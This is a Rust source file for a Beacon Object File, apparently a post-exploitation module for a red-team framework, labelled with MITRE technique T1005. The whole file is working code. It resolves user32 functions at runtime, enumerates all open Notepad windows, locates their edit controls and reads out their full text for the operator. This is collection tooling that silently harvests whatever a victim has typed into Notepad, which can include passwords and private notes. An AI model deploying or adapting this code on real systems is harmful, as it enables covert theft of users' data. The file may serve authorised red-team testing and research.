#![no_std]
#![cfg_attr(not(test), no_main)]
use common::{dfr_fn, mitre::Technique};
use rustbof::{print, println};
const TECHNIQUES: &[Technique] = &[Technique {
    id: "T1005",
    name: "Data from Local System",
    tactic: "Collection",
}];
const WM_GETTEXT: u32 = 0x000D;
const WM_GETTEXTLENGTH: u32 = 0x000E;
dfr_fn!(enum_windows(cb:extern "system" fn(usize,isize)->i32,p:isize)->i32,module="user32.dll",api="EnumWindows");
dfr_fn!(get_class_name_w(h:usize,b:*mut u16,n:i32)->i32,module="user32.dll",api="GetClassNameW");
dfr_fn!(find_window_ex_w(p:usize,a:usize,c:*const u16,t:*const u16)->usize,module="user32.dll",api="FindWindowExW");
dfr_fn!(send_message_w(h:usize,m:u32,w:usize,l:isize)->isize,module="user32.dll",api="SendMessageW");
extern "system" fn callback(hwnd: usize, _: isize) -> i32 {
    let mut cls = [0u16; 32];
    let n = unsafe { get_class_name_w(hwnd, cls.as_mut_ptr(), 31) }.unwrap_or(0);
    let notepad: [u16; 8] = [78, 111, 116, 101, 112, 97, 100, 0];
    if n == 7 && cls[..7] == notepad[..7] {
        let child = find_text_control(hwnd, 0);
        if child != 0 {
            let len = unsafe { send_message_w(child, WM_GETTEXTLENGTH, 0, 0) }.unwrap_or(0);
            if len > 0 {
                let mut buf = [0u16; 4096];
                let cap = ((len as usize) + 1).min(buf.len());
                let got =
                    unsafe { send_message_w(child, WM_GETTEXT, cap, buf.as_mut_ptr() as isize) }
                        .unwrap_or(0);
                if got > 0 {
                    println!("--- Notepad HWND 0x{:X} ---", hwnd);
                    for &c in &buf[..got as usize] {
                        if c == 10 {
                            println!("")
                        } else if c == 13 {
                        } else if c < 128 {
                            print!("{}", c as u8 as char)
                        } else {
                            print!("?")
                        }
                    }
                    println!("");
                }
            }
        }
    }
    1
}

fn class_matches(hwnd: usize, expected: &[u8]) -> bool {
    let mut class = [0u16; 32];
    let len = unsafe { get_class_name_w(hwnd, class.as_mut_ptr(), 31) }.unwrap_or(0);
    len as usize == expected.len()
        && class[..len as usize]
            .iter()
            .zip(expected)
            .all(|(&wide, &ascii)| wide == ascii as u16)
}

fn find_text_control(parent: usize, depth: u32) -> usize {
    if depth > 5 {
        return 0;
    }
    let mut child = 0usize;
    loop {
        child = unsafe { find_window_ex_w(parent, child, core::ptr::null(), core::ptr::null()) }
            .unwrap_or(0);
        if child == 0 {
            return 0;
        }
        if class_matches(child, b"Edit")
            || class_matches(child, b"RichEditD2DPT")
            || class_matches(child, b"RichEdit50W")
        {
            return child;
        }
        let nested = find_text_control(child, depth + 1);
        if nested != 0 {
            return nested;
        }
    }
}

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    println!("[*] Enumerating Notepad windows (text capped at 4095 UTF-16 units)");
    let _ = unsafe { enum_windows(callback, 0) };
}
